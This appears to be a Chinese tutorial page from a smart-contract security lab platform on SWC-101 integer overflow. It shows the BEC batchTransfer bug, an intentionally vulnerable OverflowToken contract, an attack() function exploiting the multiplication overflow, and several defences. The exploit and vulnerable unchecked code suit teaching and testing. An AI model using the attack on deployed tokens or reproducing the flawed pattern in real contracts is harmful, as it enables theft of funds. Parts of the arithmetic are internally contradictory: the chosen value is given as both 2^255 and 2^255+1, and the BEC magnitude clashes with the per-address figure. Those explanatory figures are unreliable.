# 整数溢出与精度损失

**SWC-101** · 难度 ⭐⭐ · 平台案例 2

## 漏洞本质

EVM 整数是定长的（`uint256` = 256 bit）。算术结果若超过表示范围会发生：

- **上溢 (overflow)**：`type(uint256).max + 1 = 0`
- **下溢 (underflow)**：`uint256(0) - 1 = type(uint256).max`

Solidity **0.8+** 已默认对算术检查并 revert，但通过 `unchecked { ... }` 块可以绕过。0.8 以前的版本则完全没有保护，是漏洞重灾区。

## 历史案例：BEC 代币 (2018)

BEC（BeautyChain）的 batchTransfer 漏洞，让攻击者凭空提取 $5e58$ 数量级的代币，直接导致代币归零：

```solidity
function batchTransfer(address[] _receivers, uint256 _value) public {
    uint256 cnt = _receivers.length;
    uint256 amount = uint256(cnt) * _value;     // ❌ 乘法溢出
    require(balances[msg.sender] >= amount);    // 0 ≥ 0 通过
    balances[msg.sender] -= amount;             // 不扣
    for (uint256 i = 0; i < cnt; i++) {
        balances[_receivers[i]] += _value;       // 每人增 _value
    }
}
```

只要 `_value × cnt` 上溢到 0，余额校验就被绕过，攻击者给自己的两个地址各转 $2^{255}$ 个代币。

## OverflowToken 示例（本平台）

```solidity
contract OverflowToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(uint256 amount) external {
        unchecked {
            balanceOf[msg.sender] += amount;
            totalSupply += amount;
        }
    }

    function batchTransfer(address[] calldata recipients, uint256 amount) external returns (bool) {
        uint256 cnt = recipients.length;
        unchecked {
            uint256 total = amount * cnt;   // ❌ 溢出点
            require(balanceOf[msg.sender] >= total, "insufficient");
            balanceOf[msg.sender] -= total;
            for (uint256 i = 0; i < cnt; i++) {
                balanceOf[recipients[i]] += amount;
            }
        }
        return true;
    }
}
```

## 攻击思路

```solidity
function attack() external {
    t.mint(100);                                  // 给自己 100 代币
    address[] memory rs = new address[](2);
    rs[0] = msg.sender;
    rs[1] = address(this);

    // 2 * huge 溢出到 0
    uint256 huge = (type(uint256).max / 2) + 1;
    t.batchTransfer(rs, huge);                   // total = 0
}                                                 // recipients 各得 huge 代币
```

`huge` 选 $2^{255} + 1$，`2 * huge = 2^{256}+2 ≡ 2 (mod 2^{256})`——不过 require 校验的是 `total >= cnt * amount` 计算后的值，且 `unchecked` 块里 total 直接溢出回卷。即便不严格归零，只要小于 sender 余额就能绕过校验。

## 防御一：升级到 0.8+ 默认检查

```solidity
pragma solidity ^0.8.20;

function batchTransfer(address[] calldata rs, uint256 amount) external {
    uint256 total = amount * rs.length;   // ✅ 默认溢出 revert
    require(balanceOf[msg.sender] >= total, "insufficient");
    ...
}
```

去掉 `unchecked` 块，编译器自动插入检查。

## 防御二：SafeMath (老版本)

```solidity
using SafeMath for uint256;
uint256 total = amount.mul(rs.length);  // SafeMath.mul 溢出会 revert
```

OpenZeppelin 的 SafeMath 库——0.8 之前每个项目都该用。

## 防御三：分别累加

```solidity
uint256 total = 0;
for (uint256 i = 0; i < rs.length; i++) {
    total += amount;     // 逐次累加, 即使 unchecked 也好捕获
    require(total <= balanceOf[msg.sender]);
}
```

## 精度损失：另一种相关问题

并非所有"算错了"都是溢出。**Solidity 整数除法向下取整**：

```solidity
// ❌ 先除后乘 → 精度丢失
uint256 fee = amount / 100 * 3;     // 若 amount=99, fee=0

// ✅ 先乘后除
uint256 fee = amount * 3 / 100;
```

DeFi 协议里这种「先除后乘」漏洞每年都还有人犯。

## 实战

进入 **整数溢出 - batchTransfer** 实验，使用平台提供的 `OverflowAttacker.sol` 模板，看 sum(balanceOf) 是如何 >> totalSupply 的：

```
sum(balanceOf 各地址) = 115792089237316195423570985008687907853269984665640564039457...
totalSupply = 100
```

差了 75 个数量级——这就是溢出的威力。
